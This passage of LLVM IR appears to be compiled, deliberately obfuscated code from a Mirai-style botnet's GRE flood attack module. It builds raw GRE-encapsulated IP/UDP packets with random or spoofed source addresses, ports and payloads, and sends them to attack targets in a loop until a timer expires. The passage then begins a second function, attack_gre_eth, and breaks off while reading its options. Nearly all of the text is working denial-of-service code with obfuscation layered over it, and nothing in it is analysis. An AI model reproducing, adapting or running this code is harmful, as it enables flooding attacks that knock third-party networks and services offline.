  store i32 1, i32* %11, align 4
  %90 = load i32, i32* %12, align 4
  %91 = bitcast i32* %11 to i8*
  %92 = call i32 @setsockopt(i32 %90, i32 0, i32 3, i8* %91, i32 4) #6
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %97

; <label>:94:                                     ; preds = %89
  %95 = load i32, i32* %12, align 4
  %96 = call i32 @close(i32 %95)
  br label %557

; <label>:97:                                     ; preds = %89
  store i32 0, i32* %11, align 4
  br label %98

; <label>:98:                                     ; preds = %311, %97
  %99 = load i32, i32* %11, align 4
  %100 = load i8, i8* %7, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  br i1 %102, label %103, label %317

; <label>:103:                                    ; preds = %98
  %104 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %105 = load i8**, i8*** %13, align 8
  %106 = load i32, i32* %11, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8*, i8** %105, i64 %107
  store i8* %104, i8** %108, align 8
  %109 = load i8**, i8*** %13, align 8
  %110 = load i32, i32* %11, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8*, i8** %109, i64 %111
  %113 = load i8*, i8** %112, align 8
  %114 = bitcast i8* %113 to %struct.iphdr*
  store %struct.iphdr* %114, %struct.iphdr** %25, align 8
  %115 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %116 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %115, i64 1
  %117 = bitcast %struct.iphdr* %116 to %struct.grehdr*
  store %struct.grehdr* %117, %struct.grehdr** %26, align 8
  %118 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %119 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %118, i64 1
  %120 = bitcast %struct.grehdr* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %27, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.udphdr*
  store %struct.udphdr* %123, %struct.udphdr** %28, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %125 = bitcast %struct.iphdr* %124 to i8*
  %126 = load i8, i8* %125, align 4
  %127 = xor i8 15, -1
  %128 = xor i8 %126, %127
  %129 = and i8 %128, %126
  %130 = and i8 %126, 15
  %131 = and i8 %129, 64
  %132 = xor i8 %129, 64
  %133 = or i8 %131, %132
  %134 = or i8 %129, 64
  store i8 %133, i8* %125, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = xor i8 %137, -1
  %139 = xor i8 -16, -1
  %140 = xor i8 69, -1
  %141 = or i8 %138, %139
  %142 = or i8 69, %140
  %143 = xor i8 %141, -1
  %144 = and i8 %143, %142
  %145 = and i8 %137, -16
  %146 = and i8 %144, 5
  %147 = xor i8 %144, 5
  %148 = or i8 %146, %147
  %149 = or i8 %144, 5
  store i8 %148, i8* %136, align 4
  %150 = load i8, i8* %14, align 1
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 1
  store i8 %150, i8* %152, align 1
  %153 = load i32, i32* %20, align 4
  %154 = sext i32 %153 to i64
  %155 = sub i64 0, %154
  %156 = sub i64 52, %155
  %157 = add i64 52, %154
  %158 = trunc i64 %156 to i16
  %159 = call zeroext i16 @htons(i16 zeroext %158) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 2
  store i16 %159, i16* %161, align 2
  %162 = load i16, i16* %15, align 2
  %163 = call zeroext i16 @htons(i16 zeroext %162) #7
  %164 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 3
  store i16 %163, i16* %165, align 4
  %166 = load i8, i8* %16, align 1
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 5
  store i8 %166, i8* %168, align 4
  %169 = load i8, i8* %17, align 1
  %170 = icmp ne i8 %169, 0
  br i1 %170, label %171, label %175

; <label>:171:                                    ; preds = %103
  %172 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 4
  store i16 %172, i16* %174, align 2
  br label %175

; <label>:175:                                    ; preds = %171, %103
  %176 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 6
  store i8 47, i8* %177, align 1
  %178 = load i32, i32* %23, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 8
  store i32 %178, i32* %180, align 4
  %181 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %182 = load i32, i32* %11, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 9
  store i32 %186, i32* %188, align 4
  %189 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %190 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %191 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %190, i32 0, i32 1
  store i16 %189, i16* %191, align 2
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = bitcast %struct.iphdr* %192 to i8*
  %194 = load i8, i8* %193, align 4
  %195 = xor i8 %194, -1
  %196 = xor i8 15, -1
  %197 = xor i8 -65, -1
  %198 = or i8 %195, %196
  %199 = or i8 -65, %197
  %200 = xor i8 %198, -1
  %201 = and i8 %200, %199
  %202 = and i8 %194, 15
  %203 = and i8 %201, 64
  %204 = xor i8 %201, 64
  %205 = or i8 %203, %204
  %206 = or i8 %201, 64
  store i8 %205, i8* %193, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %208 = bitcast %struct.iphdr* %207 to i8*
  %209 = load i8, i8* %208, align 4
  %210 = xor i8 -16, -1
  %211 = xor i8 %209, %210
  %212 = and i8 %211, %209
  %213 = and i8 %209, -16
  %214 = and i8 %212, 5
  %215 = xor i8 %212, 5
  %216 = or i8 %214, %215
  %217 = or i8 %212, 5
  store i8 %216, i8* %208, align 4
  %218 = load i8, i8* %14, align 1
  %219 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 1
  store i8 %218, i8* %220, align 1
  %221 = load i32, i32* %20, align 4
  %222 = sext i32 %221 to i64
  %223 = sub i64 0, %222
  %224 = sub i64 28, %223
  %225 = add i64 28, %222
  %226 = trunc i64 %224 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #7
  %228 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 2
  store i16 %227, i16* %229, align 2
  %230 = load i16, i16* %15, align 2
  %231 = zext i16 %230 to i32
  %232 = xor i32 %231, -1
  %233 = and i32 -1270763095, %232
  %234 = xor i32 -1270763095, -1
  %235 = and i32 %231, %234
  %236 = xor i32 -1, -1
  %237 = and i32 %236, -1270763095
  %238 = and i32 -1, %234
  %239 = or i32 %233, %235
  %240 = or i32 %237, %238
  %241 = xor i32 %239, %240
  %242 = xor i32 %231, -1
  %243 = trunc i32 %241 to i16
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 3
  store i16 %244, i16* %246, align 4
  %247 = load i8, i8* %16, align 1
  %248 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 5
  store i8 %247, i8* %249, align 4
  %250 = load i8, i8* %17, align 1
  %251 = icmp ne i8 %250, 0
  br i1 %251, label %252, label %256

; <label>:252:                                    ; preds = %175
  %253 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %254 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 4
  store i16 %253, i16* %255, align 2
  br label %256

; <label>:256:                                    ; preds = %252, %175
  %257 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 6
  store i8 17, i8* %258, align 1
  %259 = call i32 @rand_next()
  %260 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 8
  store i32 %259, i32* %261, align 4
  %262 = load i8, i8* %22, align 1
  %263 = icmp ne i8 %262, 0
  br i1 %263, label %264, label %270

; <label>:264:                                    ; preds = %256
  %265 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 9
  %267 = load i32, i32* %266, align 4
  %268 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  br label %291

; <label>:270:                                    ; preds = %256
  %271 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 8
  %273 = load i32, i32* %272, align 4
  %274 = sub i32 %273, 2110409994
  %275 = sub i32 %274, 1024
  %276 = add i32 %275, 2110409994
  %277 = sub i32 %273, 1024
  %278 = xor i32 %276, -1
  %279 = and i32 1838715264, %278
  %280 = xor i32 1838715264, -1
  %281 = and i32 %276, %280
  %282 = xor i32 -1, -1
  %283 = and i32 %282, 1838715264
  %284 = and i32 -1, %280
  %285 = or i32 %279, %281
  %286 = or i32 %283, %284
  %287 = xor i32 %285, %286
  %288 = xor i32 %276, -1
  %289 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 9
  store i32 %287, i32* %290, align 4
  br label %291

; <label>:291:                                    ; preds = %270, %264
  %292 = load i16, i16* %18, align 2
  %293 = call zeroext i16 @htons(i16 zeroext %292) #7
  %294 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 0
  store i16 %293, i16* %295, align 2
  %296 = load i16, i16* %19, align 2
  %297 = call zeroext i16 @htons(i16 zeroext %296) #7
  %298 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 1
  store i16 %297, i16* %299, align 2
  %300 = load i32, i32* %20, align 4
  %301 = sext i32 %300 to i64
  %302 = sub i64 0, 8
  %303 = sub i64 0, %301
  %304 = add i64 %302, %303
  %305 = sub i64 0, %304
  %306 = add i64 8, %301
  %307 = trunc i64 %305 to i16
  %308 = call zeroext i16 @htons(i16 zeroext %307) #7
  %309 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %310 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %309, i32 0, i32 2
  store i16 %308, i16* %310, align 2
  br label %311

; <label>:311:                                    ; preds = %291
  %312 = load i32, i32* %11, align 4
  %313 = add i32 %312, -1509370462
  %314 = add i32 %313, 1
  %315 = sub i32 %314, -1509370462
  %316 = add nsw i32 %312, 1
  store i32 %315, i32* %11, align 4
  br label %98

; <label>:317:                                    ; preds = %98
  br label %318

; <label>:318:                                    ; preds = %556, %317
  store i32 0, i32* %11, align 4
  br label %319

; <label>:319:                                    ; preds = %543, %318
  %320 = load i32, i32* %11, align 4
  %321 = load i8, i8* %7, align 1
  %322 = zext i8 %321 to i32
  %323 = icmp slt i32 %320, %322
  br i1 %323, label %324, label %550

; <label>:324:                                    ; preds = %319
  %325 = load i8**, i8*** %13, align 8
  %326 = load i32, i32* %11, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds i8*, i8** %325, i64 %327
  %329 = load i8*, i8** %328, align 8
  store i8* %329, i8** %29, align 8
  %330 = load i8*, i8** %29, align 8
  %331 = bitcast i8* %330 to %struct.iphdr*
  store %struct.iphdr* %331, %struct.iphdr** %30, align 8
  %332 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %333 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %332, i64 1
  %334 = bitcast %struct.iphdr* %333 to %struct.grehdr*
  store %struct.grehdr* %334, %struct.grehdr** %31, align 8
  %335 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %336 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %335, i64 1
  %337 = bitcast %struct.grehdr* %336 to %struct.iphdr*
  store %struct.iphdr* %337, %struct.iphdr** %32, align 8
  %338 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i64 1
  %340 = bitcast %struct.iphdr* %339 to %struct.udphdr*
  store %struct.udphdr* %340, %struct.udphdr** %33, align 8
  %341 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %342 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %341, i64 1
  %343 = bitcast %struct.udphdr* %342 to i8*
  store i8* %343, i8** %34, align 8
  %344 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %345 = load i32, i32* %11, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i32 0, i32 2
  %349 = load i8, i8* %348, align 4
  %350 = zext i8 %349 to i32
  %351 = icmp slt i32 %350, 32
  br i1 %351, label %352, label %375

; <label>:352:                                    ; preds = %324
  %353 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %354 = load i32, i32* %11, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %353, i64 %355
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i32 0, i32 1
  %358 = load i32, i32* %357, align 4
  %359 = call i32 @ntohl(i32 %358) #7
  %360 = call i32 @rand_next()
  %361 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %362 = load i32, i32* %11, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i64 %363
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i32 0, i32 2
  %366 = load i8, i8* %365, align 4
  %367 = zext i8 %366 to i32
  %368 = lshr i32 %360, %367
  %369 = sub i32 0, %368
  %370 = sub i32 %359, %369
  %371 = add i32 %359, %368
  %372 = call i32 @htonl(i32 %370) #7
  %373 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  store i32 %372, i32* %374, align 4
  br label %375

; <label>:375:                                    ; preds = %352, %324
  %376 = load i32, i32* %23, align 4
  %377 = icmp eq i32 %376, -1
  br i1 %377, label %378, label %382

; <label>:378:                                    ; preds = %375
  %379 = call i32 @rand_next()
  %380 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 8
  store i32 %379, i32* %381, align 4
  br label %382

; <label>:382:                                    ; preds = %378, %375
  %383 = load i16, i16* %15, align 2
  %384 = zext i16 %383 to i32
  %385 = icmp eq i32 %384, 65535
  br i1 %385, label %386, label %416

; <label>:386:                                    ; preds = %382
  %387 = call i32 @rand_next()
  %388 = xor i32 %387, -1
  %389 = xor i32 65535, -1
  %390 = xor i32 -1286971083, -1
  %391 = or i32 %388, %389
  %392 = or i32 -1286971083, %390
  %393 = xor i32 %391, -1
  %394 = and i32 %393, %392
  %395 = and i32 %387, 65535
  %396 = trunc i32 %394 to i16
  %397 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 3
  store i16 %396, i16* %398, align 4
  %399 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i32 0, i32 3
  %401 = load i16, i16* %400, align 4
  %402 = zext i16 %401 to i32
  %403 = sub i32 %402, -173417661
  %404 = sub i32 %403, 1000
  %405 = add i32 %404, -173417661
  %406 = sub nsw i32 %402, 1000
  %407 = xor i32 %405, -1
  %408 = and i32 -1, %407
  %409 = xor i32 -1, -1
  %410 = and i32 %405, %409
  %411 = or i32 %408, %410
  %412 = xor i32 %405, -1
  %413 = trunc i32 %411 to i16
  %414 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 3
  store i16 %413, i16* %415, align 4
  br label %416

; <label>:416:                                    ; preds = %386, %382
  %417 = load i16, i16* %18, align 2
  %418 = zext i16 %417 to i32
  %419 = icmp eq i32 %418, 65535
  br i1 %419, label %420, label %433

; <label>:420:                                    ; preds = %416
  %421 = call i32 @rand_next()
  %422 = xor i32 %421, -1
  %423 = xor i32 65535, -1
  %424 = xor i32 -294181751, -1
  %425 = or i32 %422, %423
  %426 = or i32 -294181751, %424
  %427 = xor i32 %425, -1
  %428 = and i32 %427, %426
  %429 = and i32 %421, 65535
  %430 = trunc i32 %428 to i16
  %431 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %432 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %431, i32 0, i32 0
  store i16 %430, i16* %432, align 2
  br label %433

; <label>:433:                                    ; preds = %420, %416
  %434 = load i16, i16* %19, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %446

; <label>:437:                                    ; preds = %433
  %438 = call i32 @rand_next()
  %439 = xor i32 65535, -1
  %440 = xor i32 %438, %439
  %441 = and i32 %440, %438
  %442 = and i32 %438, 65535
  %443 = trunc i32 %441 to i16
  %444 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %445 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %444, i32 0, i32 1
  store i16 %443, i16* %445, align 2
  br label %446

; <label>:446:                                    ; preds = %437, %433
  %447 = load i8, i8* %22, align 1
  %448 = icmp ne i8 %447, 0
  br i1 %448, label %453, label %449

; <label>:449:                                    ; preds = %446
  %450 = call i32 @rand_next()
  %451 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 9
  store i32 %450, i32* %452, align 4
  br label %459

; <label>:453:                                    ; preds = %446
  %454 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 9
  %456 = load i32, i32* %455, align 4
  %457 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %458 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %457, i32 0, i32 9
  store i32 %456, i32* %458, align 4
  br label %459

; <label>:459:                                    ; preds = %453, %449
  %460 = load i8, i8* %21, align 1
  %461 = icmp ne i8 %460, 0
  br i1 %461, label %462, label %469

; <label>:462:                                    ; preds = %459
  %463 = load i8*, i8** %34, align 8
  %464 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %463, i32 %464)
  %465 = load i8*, i8** %34, align 8
  %466 = load i32, i32* %20, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds i8, i8* %465, i64 %467
  store i8 0, i8* %468, align 1
  br label %469

; <label>:469:                                    ; preds = %462, %459
  %470 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 7
  store i16 0, i16* %471, align 2
  %472 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %473 = bitcast %struct.iphdr* %472 to i16*
  %474 = call zeroext i16 @checksum_generic(i16* %473, i32 20)
  %475 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 7
  store i16 %474, i16* %476, align 2
  %477 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 7
  store i16 0, i16* %478, align 2
  %479 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %480 = bitcast %struct.iphdr* %479 to i16*
  %481 = call zeroext i16 @checksum_generic(i16* %480, i32 20)
  %482 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 7
  store i16 %481, i16* %483, align 2
  %484 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %485 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %484, i32 0, i32 3
  store i16 0, i16* %485, align 2
  %486 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %487 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %488 = bitcast %struct.udphdr* %487 to i8*
  %489 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %490 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %489, i32 0, i32 2
  %491 = load i16, i16* %490, align 2
  %492 = load i32, i32* %20, align 4
  %493 = sext i32 %492 to i64
  %494 = add i64 8, 5810274293991187481
  %495 = add i64 %494, %493
  %496 = sub i64 %495, 5810274293991187481
  %497 = add i64 8, %493
  %498 = trunc i64 %496 to i32
  %499 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %486, i8* %488, i16 zeroext %491, i32 %498)
  %500 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %501 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %500, i32 0, i32 3
  store i16 %499, i16* %501, align 2
  %502 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %503 = load i32, i32* %11, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %502, i64 %504
  %506 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %505, i32 0, i32 0
  %507 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %506, i32 0, i32 0
  store i16 2, i16* %507, align 4
  %508 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 9
  %510 = load i32, i32* %509, align 4
  %511 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %512 = load i32, i32* %11, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %511, i64 %513
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i32 0, i32 0
  %516 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %515, i32 0, i32 2
  %517 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %516, i32 0, i32 0
  store i32 %510, i32* %517, align 4
  %518 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %519 = load i32, i32* %11, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %518, i64 %520
  %522 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %521, i32 0, i32 0
  %523 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %522, i32 0, i32 1
  store i16 0, i16* %523, align 2
  %524 = load i32, i32* %12, align 4
  %525 = load i8*, i8** %29, align 8
  %526 = load i32, i32* %20, align 4
  %527 = sext i32 %526 to i64
  %528 = sub i64 0, 52
  %529 = sub i64 0, %527
  %530 = add i64 %528, %529
  %531 = sub i64 0, %530
  %532 = add i64 52, %527
  %533 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %534 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %535 = load i32, i32* %11, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %534, i64 %536
  %538 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %537, i32 0, i32 0
  %539 = bitcast %struct.sockaddr_in* %538 to %struct.sockaddr*
  store %struct.sockaddr* %539, %struct.sockaddr** %533, align 8
  %540 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %541 = load %struct.sockaddr*, %struct.sockaddr** %540, align 8
  %542 = call i64 @sendto(i32 %524, i8* %525, i64 %531, i32 16384, %struct.sockaddr* %541, i32 16)
  br label %543

; <label>:543:                                    ; preds = %469
  %544 = load i32, i32* %11, align 4
  %545 = sub i32 0, %544
  %546 = sub i32 0, 1
  %547 = add i32 %545, %546
  %548 = sub i32 0, %547
  %549 = add nsw i32 %544, 1
  store i32 %548, i32* %11, align 4
  br label %319

; <label>:550:                                    ; preds = %319
  %551 = call i64 @time(i64* null) #6
  %552 = load i32, i32* %24, align 4
  %553 = sext i32 %552 to i64
  %554 = icmp sgt i64 %551, %553
  br i1 %554, label %555, label %556

; <label>:555:                                    ; preds = %550
  br label %557

; <label>:556:                                    ; preds = %550
  br label %318

; <label>:557:                                    ; preds = %555, %94, %88
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
